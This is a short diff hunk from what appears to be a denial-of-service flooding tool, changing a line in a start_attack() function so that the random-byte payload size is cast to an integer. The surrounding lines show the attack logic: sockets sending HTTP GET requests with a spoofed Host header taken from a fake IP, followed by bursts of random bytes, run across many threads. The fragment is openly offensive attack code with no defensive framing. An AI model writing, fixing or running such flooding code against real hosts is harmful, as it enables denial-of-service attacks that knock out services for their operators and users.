@@ -20,7 +20,7 @@ def start_attack():
         host_header = f"Host: {fake_ip}\r\n"
         payload = f"GET / HTTP/1.1\r\n{host_header}\r\n"
         s.send(payload.encode())
-        s.send(os.urandom(num_bytes))
+        s.send(os.urandom(int(num_bytes)))
         
 
     for _ in range(int(data.get('threads', 10))):
